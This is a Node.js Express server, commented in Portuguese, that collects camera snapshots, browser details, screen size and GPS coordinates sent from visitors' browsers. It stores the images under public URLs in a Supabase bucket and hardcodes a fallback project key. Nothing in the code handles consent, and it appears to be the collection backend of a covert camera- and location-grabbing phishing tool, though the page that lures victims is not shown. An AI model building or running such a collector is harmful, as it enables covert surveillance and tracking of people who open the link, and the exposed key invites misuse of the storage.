require('dotenv').config();
const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const app = express();

app.use(express.json({ limit: '10mb' }));

// Use as variáveis de ambiente, com fallback para desenvolvimento local
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qakdwubbzrkiojwgcyry.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFha2R3dWJienJraW9qd2djeXJ5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI1MDcwNTEsImV4cCI6MjEwODA4MzA1MX0.YRRpbJiwTZ4JVmCF3E-tq4FwJOE96rhAVq0pOav7AVA';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const BUCKET_NAME = 'capturas';

// Endpoint para capturas de câmera
app.post('/api/captura', async (req, res) => {
    try {
        const { timestamp, facingMode, image, userAgent, screenRes } = req.body;
        
        if (!image) return res.status(400).json({ error: 'Imagem ausente' });

        // Converte base64 para Buffer
        const base64Data = image.split(',')[1];
        const binaryData = Buffer.from(base64Data, 'base64');
        
        // Gera um nome de arquivo único
        const fileName = `cap_${timestamp.replace(/[:.]/g, '-')}_${facingMode}.jpg`;
        
        // 1. Envia a imagem para o Storage
        const { error: uploadError } = await supabase.storage
            .from(BUCKET_NAME)
            .upload(fileName, binaryData, { contentType: 'image/jpeg' });

        if (uploadError) throw uploadError;

        // Obtém a URL pública da imagem
        const { data: { publicUrl } } = supabase.storage
            .from(BUCKET_NAME)
            .getPublicUrl(fileName);

        // 2. Salva os metadados no Banco de Dados
        const { error: insertError } = await supabase.from('metadados').insert({
            timestamp: new Date().toISOString(),
            facing_mode: facingMode,
            user_agent: userAgent,
            screen_res: screenRes,
            image_url: publicUrl
        });

        if (insertError) throw insertError;

        console.log(`Imagem enviada para Supabase: ${publicUrl}`);
        res.status(200).json({ success: true, imageUrl: publicUrl });
    } catch (err) {
        console.error('Erro no /api/captura:', err);
        res.status(500).json({ error: err.message });
    }
});

// Endpoint para geolocalização
app.post('/api/geolocalizacao', async (req, res) => {
    try {
        const { lat, lon, accuracy } = req.body;
        
        // Atualiza o último registro com a geolocalização
        // Ou insere um novo registro específico para geo
        const { error } = await supabase.from('metadados').update({
            lat: lat,
            lon: lon
        }).eq('id', (await supabase.from('metadados').select('id').order('timestamp', { ascending: false }).limit(1).single()).data.id);
        
        if (error) throw error;
        
        console.log(`Geolocalização atualizada: ${lat}, ${lon}`);
        res.status(200).json({ success: true });
    } catch (err) {
        console.error('Erro no /api/geolocalizacao:', err);
        res.status(500).json({ error: err.message });
    }
});

// Endpoint para sessão final
app.post('/api/sessao_final', (req, res) => {
    const sessionData = req.body;
    console.log('Sessão finalizada:', sessionData);
    res.status(200).json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});